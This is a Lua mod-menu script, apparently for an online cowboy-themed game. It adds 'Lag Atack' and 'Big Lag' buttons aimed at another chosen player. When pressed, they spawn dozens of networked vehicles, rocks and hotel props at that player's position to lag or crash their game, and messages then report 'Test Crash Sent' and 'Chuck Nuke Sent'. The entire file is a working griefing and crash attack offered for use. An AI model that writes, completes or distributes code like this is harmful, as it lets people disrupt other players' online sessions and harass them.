script.set_name('Lag Atack')
toast.add_info('Lag Atack ready!')

HASH_BIG_ROCK = native.misc.get_hash_key('mp_big_rock_scan_07')
HASH_HOTEL = native.misc.get_hash_key('p_mvhotel_01')
VEHICLE_HASH_1 = 0xC6FA5BFF
VEHICLE_HASH_2 = 0xA385E1C7
VEHICLE_HASH_3 = 0x861D4C6A
PROP_HASH = 0xA631E858

local sub = menu.player_root()

sub:add_button('Lag Atack', {"Stay Clear from this!"}, function (playerIdx)
    local target_ped = native.player.get_player_ped_script_index(playerIdx)
    local player_name = player.get_name(playerIdx)
    local target_pos = native.entity.get_offset_from_entity_in_world_coords(target_ped, 0, 0, 13)
    local x, y, z =  target_pos.x, target_pos.y, target_pos.z
    native.streaming.request_model(PROP_HASH, true)
    for i = 1, 31 do
     native.object.create_object(PROP_HASH, x, y, z, true, true, true, true, true) 
    end
    toast.add_info('Test Crash Sent to ' .. player_name)

    local target_ped = native.player.get_player_ped_script_index(playerIdx)
    local player_name = player.get_name(playerIdx)
    local target_pos = native.entity.get_offset_from_entity_in_world_coords(target_ped, 0, 0, 15)
    local x, y, z =  target_pos.x, target_pos.y, target_pos.z
    native.streaming.request_model(VEHICLE_HASH_1, true)
    for i = 1, 31 do                           
        native.vehicle.create_vehicle(VEHICLE_HASH_1, x, y, z, 1, true, true, true, false)
    end        

    local target_ped = native.player.get_player_ped_script_index(playerIdx)
    local player_name = player.get_name(playerIdx)
    local target_pos = native.entity.get_offset_from_entity_in_world_coords(target_ped, 0, 0, 20)
    local x, y, z =  target_pos.x, target_pos.y, target_pos.z
    native.streaming.request_model(VEHICLE_HASH_2, true)
    for i = 1, 31 do                           
        native.vehicle.create_vehicle(VEHICLE_HASH_2, x, y, z, 1, true, true, true, false)
    end        
end)

sub:add_button('Big Lag', {"Will Lag you hard if near by!"}, function (playerIdx)
    local target_ped = native.player.get_player_ped_script_index(playerIdx)
    local player_name = player.get_name(playerIdx)
    local target_pos = native.entity.get_offset_from_entity_in_world_coords(target_ped, 0, 0.6, 0)
    local x, y, z = target_pos.x, target_pos.y, target_pos.z
    local zzz = z - 2
    local zz = z - 13
    local yy = y + 1
    local yyy = y - 6
    local ff = x + 2
    local focus_0 = z + 65
    local focus_2 = z + 7000
    local focus_3 = z + 30
    local focus_4 = z + 20
    local focus_5 = z + 15
    
    native.streaming.request_model(VEHICLE_HASH_3, true) -- "bountywagon01x"
    native.streaming.request_model(VEHICLE_HASH_2, true)
    
    local A = native.vehicle.create_vehicle(VEHICLE_HASH_2, x, y, focus_0, 1, true, true, true, false)
    
    native.streaming.set_focus_entity(A)
    
    native.object.create_object(HASH_BIG_ROCK, x, y + 5, focus_2, true, true, true, true, false)

    for i = 1, 12 do
        native.vehicle.create_vehicle(VEHICLE_HASH_3, x, y, focus_3, 1, true, true, true, false)
    end

    thread.yield(100)

    native.streaming.request_model(0xA631E858, true)
    
    for i = 1, 31 do
      native.object.create_object(0xA631E858, x, y - 4, focus_5, true, true, true, true, true)
    end
    
    for i = 1, 10 do 
      local B = native.vehicle.create_vehicle(VEHICLE_HASH_2, x, y, focus_4, 1, true, true, true, false)
    end

    for i = 1, 5 do
        native.object.create_object(HASH_HOTEL, x, y, zz, true, true, true, true, true)
    end

    for i = 1, 21 do  
      local D = native.vehicle.create_vehicle(VEHICLE_HASH_2, ff, yy, focus_4, 1, true, true, true, false)
    end  

    for i = 1, 10 do
        native.object.create_object(HASH_BIG_ROCK, x, yyy, zzz, true, true, true, true, true)
    end

    toast.add_info('Chuck Nuke Sent to ' .. player_name)  
end) 
  
script.keep_alive()